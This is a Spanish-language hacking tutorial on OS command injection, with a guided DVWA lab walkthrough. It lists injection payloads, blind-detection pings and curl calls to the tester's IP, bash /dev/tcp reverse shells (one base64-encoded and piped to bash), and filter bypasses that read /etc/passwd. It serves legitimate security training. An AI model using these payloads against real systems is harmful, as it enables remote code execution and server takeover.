# Command Injection (Inyección de Comandos)

**Command Injection** ocurre cuando una web pasa datos del usuario a un comando del sistema operativo sin sanearlos. Es de las vulnerabilidades más críticas: lleva **directamente a ejecución de comandos (RCE)** en el servidor.

---

## Cómo se ve

Funcionalidades que "huelen" a comando del sistema: hacer ping a un host, consultar DNS (`nslookup`), convertir archivos, comprobar si una web está activa, generar PDFs...

```text
http://<IP>/ping?host=127.0.0.1
```

Por detrás el servidor ejecuta algo como `ping -c 1 <host>`. Si inyectas un separador de comandos, cuelas el tuyo.

---

## Operadores para encadenar comandos

```text
127.0.0.1; id              # ; ejecuta el segundo siempre
127.0.0.1 && id            # && si el primero tuvo éxito
127.0.0.1 | id             # | pasa la salida (y ejecuta)
127.0.0.1 || id            # || si el primero falla
127.0.0.1 & id             # & en segundo plano
$(id)                      # sustitución de comando
`id`                       # sustitución (backticks)
%0a id                     # salto de línea (newline)
```

Prueba también encerrando en comillas: `"; id; "` o `' ; id ; '` si tu entrada va dentro de una cadena.

---

## Detección

Empieza por algo inofensivo y observable:

```text
; whoami
; id
| whoami
```

Si no ves salida (inyección **ciega**), confírmala por **tiempo** o por **interacción de red**:

```text
127.0.0.1; sleep 5                 # ¿tarda 5s? -> hay inyección
127.0.0.1; ping -c 3 <TU_IP>       # escucha con tcpdump en tu máquina
```

```bash
# En tu máquina, para blind por red:
sudo tcpdump -i tun0 icmp
```

> **Consejo:** para inyección ciega, `ping` hacia tu máquina o una petición a tu servidor HTTP (`curl http://TU_IP/x`) es la forma más fiable de confirmar. Un `sleep` también vale si no puedes recibir conexiones.

---

## Conseguir una reverse shell

Una vez confirmada, lanza una reverse shell (ver *Técnicas · Shells y TTY*):

```text
; bash -c 'bash -i >& /dev/tcp/<TU_IP>/443 0>&1'
```

Si hay filtros, usa variantes (nc, python, etc.) o codifica en base64:

```bash
echo 'bash -i >& /dev/tcp/<TU_IP>/443 0>&1' | base64
# inyecta:
; echo <BASE64> | base64 -d | bash
```

---

## Bypass de filtros

| Filtro | Bypass |
| ------ | ------ |
| Espacios bloqueados | `${IFS}` → `cat${IFS}/etc/passwd`, o `{cat,/etc/passwd}` |
| Palabras clave (`cat`) | Comillas/concatenación: `c""at`, `c\at`, `/bin/c?t` |
| Slash `/` bloqueado | `${PATH:0:1}` = `/` |
| Caracteres filtrados | Codificar en base64 y decodificar en destino |
| Solo un comando | Sustitución `$(...)` dentro del argumento |

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `Burp Suite` | Probar y afinar los payloads manualmente. |
| `commix` | Explotación automática de command injection. |
| `tcpdump` | Confirmar inyección ciega por ICMP/red. |
| `revshells.com` | Generar la reverse shell adecuada. |

---

> **Consejo:** cualquier campo que acabe en un comando del sistema (ping, whois, nslookup, convertir imágenes con ImageMagick, procesar PDFs) es candidato. Confirma con `; id` o, si es ciego, con un `ping` hacia ti. En cuanto tengas ejecución, salta a una **reverse shell estable** y continúa con la escalada de privilegios.

---

## Dónde practicar la Command Injection

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — OS command injection | Labs gratis | https://portswigger.net/web-security/os-command-injection |
| DVWA — Command Injection | Descargable (Docker) | https://github.com/digininja/DVWA |
| TryHackMe — "Command Injection" | Sala guiada | https://tryhackme.com |
| VulnHub / DockerLabs | Máquinas completas | https://www.vulnhub.com · https://dockerlabs.es |
| picoCTF — *Web Exploitation* | Retos gratis | https://picoctf.org |

## Writeup guiado: Command Injection en DVWA (nivel Low)

```flow
Preparar :: DVWA en Docker, seguridad "low", sección Command Injection.
Detectar :: Encadenar un comando al ping con ";".
Ejecutar :: Confirmar RCE con id / whoami.
Escalar :: Lanzar una reverse shell y estabilizarla.
```

### Paso 1 — Preparar

En DVWA (seguridad **Low**) ve a **Command Injection**: hay un campo para hacer *ping* a una IP. Por detrás ejecuta `ping -c 4 <entrada>`.

### Paso 2 — Detectar y ejecutar

En el campo escribe:

```text
127.0.0.1; id
```

La salida muestra el ping **y** el resultado de `id` → RCE confirmada. Prueba también `| whoami` y `&& ls -la`.

### Paso 3 — Reverse shell

```bash
# A la escucha en tu máquina:
nc -lvnp 443
```

En el campo (la víctima se conecta a ti):

```text
127.0.0.1; bash -c 'bash -i >& /dev/tcp/TU_IP/443 0>&1'
```

Estabiliza la TTY (ver [Shells y TTY](../../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Shells%20y%20TTY.md)) y ya estás dentro.

> **Consejo:** en DVWA Medium se filtran `;` y `&&` → usa `|` o `%0a` (salto de línea). En High, filtran casi todo → toca encadenar con trucos (`$IFS`, codificar en base64). Practicar esos bypass es lo que marca la diferencia en máquinas reales.
